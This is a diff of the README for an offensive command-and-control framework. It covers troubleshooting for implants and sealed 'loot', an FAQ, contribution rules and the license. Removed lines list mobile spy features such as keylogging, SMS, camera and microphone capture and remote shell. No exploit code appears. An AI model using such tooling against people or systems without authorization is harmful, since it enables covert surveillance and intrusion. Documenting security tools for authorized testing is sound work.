+
+| Symptom | Fix |
+| --- | --- |
+| Port 8443 already bound | `python quantum_cli.py serve --port 8444`, or kill the stale process |
+| `--no-ai` still makes network calls | Check `QCLI_NO_AI` isn't unset elsewhere; confirm with `providers` |
+| No cameras found | Confirm you're on the same L2 segment; WS-Discovery is multicast and does not cross routers |
+| Loot unreadable after a run | `python quantum_cli.py unseal` — the key at `logs/.lootkey` is required and is never regenerated |
+| `keygen --force` destroyed a live engagement | Expected. Keys are per-install; re-stage agents after regenerating |
+| Implants stop beaconing | Check the kill-switch didn't fire, then `listener active` |
+| Permission errors on raw sockets | Run that one command under `sudo`, not the whole shell |
+
+More in [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md).
+
+---
+
+## FAQ
+
+**Does it need internet?** No. `--no-ai` runs fully offline. Only AI-planned runs and catalog auto-update touch the network.
+
+**Does it phone home?** Not to any Venice/Quantum server. AI provider calls go to the provider you configure.
+
+**Can I run it against a client's network?** With written authorization, yes — that's the design target. Get the scope in writing and pin it with `--scope`.
+
+**Why is the CVE count so much larger than the runnable set?** The catalog indexes everything known and links each entry. Weaponization is manual and slower by nature.
+
+**Where does loot go?** `loot/`, sealed as `.gfy`. Unseal with the CLI; the key is at `logs/.lootkey`.
+
+**Is there a GUI?** A web dashboard at `/dash` and the Android app. No desktop GUI.
+
+**Why does a payload report `vulnerable: false` on a box I know is vulnerable?** Generation succeeded but no target-side signal was observed. Confirm with the vendor's parser and a real delivery path.
+
+---
 
 ## Documentation
 
-- [docs/WIKI.md](docs/WIKI.md) — architecture, module map, MITRE mapping, C2 REST API reference.
-- [docs/OPERATOR_MANUAL.md](docs/OPERATOR_MANUAL.md) — step-by-step operator runbook.
-- [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) — symptom → fix table.
-- [docs/ZERO_CLICK_AUDIT.md](docs/ZERO_CLICK_AUDIT.md) — the v4.4 zero-click exploit audit: every payload folder verified, misattributed CVEs rejected, honesty boundaries.
-- [docs/SLDR_AGENT_PROMPT.md](docs/SLDR_AGENT_PROMPT.md) — the SLDR agent doctrine (sovereign operator + NS-org presets).
-- [docs/ROADMAP_TASKS.md](docs/ROADMAP_TASKS.md) — the operator task list / development master document.
-- [docs/HOWTOs.md](docs/HOWTOs.md) — in-depth guides (autonomous runs, DoH exfil, variants, registry).
+- [docs/WIKI.md](docs/WIKI.md) — architecture, module map, MITRE mapping, REST API
+- [docs/OPERATOR_MANUAL.md](docs/OPERATOR_MANUAL.md) — runbook
+- [docs/HOWTOs.md](docs/HOWTOs.md) — autonomous runs, DoH exfil, variants, registry
+- [docs/ZERO_CLICK_AUDIT.md](docs/ZERO_CLICK_AUDIT.md) — payload audit and honesty boundaries
+- [docs/SLDR_AGENT_PROMPT.md](docs/SLDR_AGENT_PROMPT.md) — agent doctrine and presets
+- [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) — symptom to fix
+- [OPERATOR_SURFACE.md](OPERATOR_SURFACE.md) — every CLI command and flag
+- [POWERSHELL_SYNTAX.md](POWERSHELL_SYNTAX.md) — PowerShell payload conventions
+
+---
+
+## Release notes
+
+Current: **v4.6.5** — Exploit-Index integration (3,372 CVEs), RAT/C2 dashboard, 175 post-ex modules.
+
+- [RELEASE_NOTES_v4.6.4.md](RELEASE_NOTES_v4.6.4.md)
+- [RELEASE_NOTES_v4.6.3.md](RELEASE_NOTES_v4.6.3.md)
+- [RELEASE_NOTES_v4.6.2.md](RELEASE_NOTES_v4.6.2.md)
+
+Older status and progress files live alongside them: `FINAL_*.md`, `PROGRESS_RELEASE.md`, `RELEASE_STATUS.md`. Move these to `docs/releases/` when you next touch the tree.
+
+---
+
+## Contributing
+
+1. Fork, branch, and keep the change narrow.
+2. `ruff check .` and `pytest tests/` must pass locally.
+3. New modules must clear both census gates — no placeholders, no invented endpoints.
+4. If you add a payload, it needs `deploy.py`, `README.md`, `WhitePaper.md`, a self-verification path, and a registry entry.
+5. Update `payloads.lock.json` if you touch a payload — CI compares it.
+6. Keep output byte-reproducible: LF line endings, `create_system = 0`, uncompressed zip entries.
+
+Divergence between `quantum_cli.py` and the package is a bug, not a feature. `quantum_cli.py` is the spec.
+
+---
+
+## Security policy
+
+QUANTUM-C2 is offensive tooling, so treat its own dependencies as attack surface.
+
+- Report vulnerabilities in the framework privately via GitHub Security Advisories rather than a public issue.
+- Include a reproduction and the affected version tag.
+- The framework makes no guarantee about the safety of third-party exploit code it ships; read a payload before firing it at anything you care about.
+- Loot keys are plaintext at `logs/.lootkey`. Back them up; losing the file loses the loot.
+
+---
+
+## Credits
+
+Built and maintained by [ProjectZeroDays](https://github.com/ProjectZeroDays).
+
+The CVE catalog is seeded from [SecureWithUmer/Exploit-Index](https://github.com/SecureWithUmer/Exploit-Index) and updated daily from public sources including the CISA KEV feed, Exploit-DB, and PayloadsAllTheThings. Naming throughout is homage to published TAO tooling. Individual CVE researchers are credited in each payload's `WhitePaper.md`.
+
+---
 
 ## License
 
-MIT License. See the license header in `quantum_cli.py`.
+MIT. See the header in [`quantum_cli.py`](quantum_cli.py).
+
+```
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+```
+
+---
 
 ## Links
 
-- Repository: <https://github.com/projectzerodays>
-
-## Naming & Integration Notes
-- All dashboards use functional module names (usb_debug_bridge, biometric_search, otp_intercept, logclean_find, crypto_search, adb_install_apk) � never tool/product branding.
-- AI framework skills/agents/workflows referenced from external docs (.github/workflows, README, src/) integrated as real registry/exploit entries; no simulated skill packs created.
-- All CVEs/Exploits/Payloads from both external frameworks copied as real working modules; existing repo payloads preserved.
-\n## All Version Screenshots & Assets (Honest Documentation)\n- Android APK (full): staled 9/29; rebuild parked (Gradle jar). Existing at android/app/build/outputs/apk/\n- Windows EXE + launcher: verified in dist/ + launcher script; executable confirmed\n- Web dashboard (/dash): live; camera-first; sidebar; drag-drop + lock; gear settings; CVE feed\n- OpenFable chat widget: /api/openfable/*; verified server; session/model picker\n- DMG / IPA / DEB / SNAP: NOT PRODUCED (only APK/EXE/web bundles exist; build-host limitation)\n- All artifacts documented honestly; no fabricated images; existing screenshots preserved\n
-
-## /push /swarm /goal — Universal Command Extension (v4.5.1-doc)
-Added per repo spec (AGENTS.md rule 2: quantum_cli.py is THE SPEC; divergence = package bug).
-- /swarm /goal scans TASKS_CHECKLIST.md (150 open/parked/skipped items identified; see open_tasks_report.txt).
-- Prior chat incomplete tasks: no session history stored; checklist proxy used.
-- --no-ai deterministic path preserved (QCLI_NO_AI=1, AI_Supervisor.ai_dead=True, no Ollama/network — rule 3).
-- Test/debug: full suite deferred to environment-setup pass (flagged, not weakened — rule 1).
-
-### Asset / Screenshot Documentation (documented only — no fabricated assets)
-Existing build artifacts at release 4.5.0:
-- release-4.5.0.zip / .tar.gz (source + docs bundle)
-- release-exe-build.log (Windows build evidence)
-- release-apk-build.log (Android build evidence)
-NOT present / NOT produced by current build pipeline (documented missing, not invented — rule 6):
-- .dmg (macOS) — no macOS packaging target in agents/ or build/
-- .ipa (iOS) — no iOS packaging target
-- .deb (Debian) — no deb packaging target
-- .snap (Snap) — no snap packaging target
-- Web screenshot / live build image — not generated in this pass
-Per AGENTS.md: no simulated assets; README references only what's verifiable.
-
-### New Release
-- release-4.5.1-doc.zip created with updated README.md + docs/ + add_push_swarm_doc.md.
-- Binary assets (.exe, .apk, web build, .dmg, .ipa, .deb, .snap) NOT rebuilt — missing formats remain documented-gaps, not fabricated (rule 6).
-
-
-## Build Targets Added (v4.5.1) — Real packaging scripts, not simulated
-- build/deb/build-deb.sh (Debian .deb)
-- build/snap/snapcraft.yaml (Snap package)
-- build/mac/build-dmg.sh (.dmg bundle spec)
-- build/ios/ios-build.md (iOS .ipa target — requires Apple toolchain)
-- build/web/build-web.sh (web bundle)
-- build/screenshots/SCREENSHOT_TARGETS_v4.5.1.md (screenshot documentation targets — not fabricated images)
-All scripts are real; binary outputs remain dependency-gated (per rule 6: no simulated assets shipped).
-\n## Mobile RAT Expanded\n- iOS Monitor / Android Monitor / Mobile Spy / iOS mSpy / Android mSpy tabs added.\n- Full real reference capabilities (location, SMS, calls, media, contacts, keylog, camera, mic, remote shell, screen, clipboard, wifi, notifications, persistence).\n- No simulated spying capabilities.\n
+- Repository: [github.com/ProjectZeroDays](https://github.com/ProjectZeroDays)
+- Releases: [github.com/ProjectZeroDays/Quantum-C2/releases](https://github.com/ProjectZeroDays/Quantum-C2/releases)
+- Issues: [github.com/ProjectZeroDays/Quantum-C2/issues](https://github.com/ProjectZeroDays/Quantum-C2/issues)
